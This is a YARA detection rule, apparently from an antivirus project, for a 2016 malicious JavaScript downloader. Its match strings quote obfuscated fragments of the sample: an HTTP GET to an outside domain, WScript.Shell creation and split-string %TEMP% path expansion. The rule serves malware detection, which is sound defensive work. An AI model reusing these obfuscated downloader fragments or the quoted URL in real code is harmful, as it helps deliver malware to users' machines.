rule sig_20160427_7fcc9b39ca730eef5255c043502b3fbc {
  meta:
    description = "datamaliciousorder - file 20160427_7fcc9b39ca730eef5255c043502b3fbc.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7811aca0e6d8d7a2eba0a4dd6525c0d7efd609cdc693a2ffa0c303caf05d85ce"

  strings:
    $s1  = "NzhbzNplbg[HmdkhLfhrs](\"G\" + \"ET\", \"http://aaacollectionsjewelry.com/ur8fgs\", false);" fullword ascii
    $s2  = "function DwnjwTuwgx() {return AvqpfUmsiz[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"mr1N3Pi" ascii
    $s3  = "function DwnjwTuwgx() {return AvqpfUmsiz[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"mr1N3Pi" ascii
    $s4  = "var AvqpfUmsiz = function QtbzgMgxzm() {return NdjmwVuima[FrtbnLkvxp](\"WScript\"+\".Shell\");}(), OzcvnGpjoj = 11;" fullword ascii
    $s5  = "function HlgyiRxzlj(SmzggWhjqu, PkvsjScvmz){OttvdGdeed = OttvdGdeed * 1; return SmzggWhjqu - PkvsjScvmz;};" fullword ascii
    $s6  = "var NdjmwVuima = this[\"WScript\"];" fullword ascii
    $s7  = "function GmmtrGsdzy(){return MkxumYpcim + \"\";};" fullword ascii
    $s8  = "if (NzhbzNplbg[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function YsxzjSotxv() {return ((TuzxxOlhey == true) && (TuzxxOlhey == FqetqRlyef)) ? 1 : OttvdGdeed;};" fullword ascii
    $s10 = "FqetqRlyef = true; " fullword ascii
    $s11 = "var TuzxxOlhey = false;" fullword ascii
    $s12 = "function TlmyiCegtu(){return FrtbnLkvxp;};" fullword ascii
    $s13 = "var QltnvOldff = new this[\"D\"+\"ate\"]();" fullword ascii
    $s14 = "function QfdzmHepsv(ArhwjGiyoz) {var VkcohMawgz = (1, 2, 3, 4, 5, ArhwjGiyoz); return VkcohMawgz;};" fullword ascii
    $s15 = "}while (QofibUwery);" fullword ascii
    $s16 = "TuzxxOlhey = true; " fullword ascii
    $s17 = "function QqfqrHpuxy()" fullword ascii
    $s18 = "var KvqtjEycbj = false;" fullword ascii
    $s19 = "var FqetqRlyef = false;" fullword ascii
    $s20 = "function LhnlyWdeyw(){return 23;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}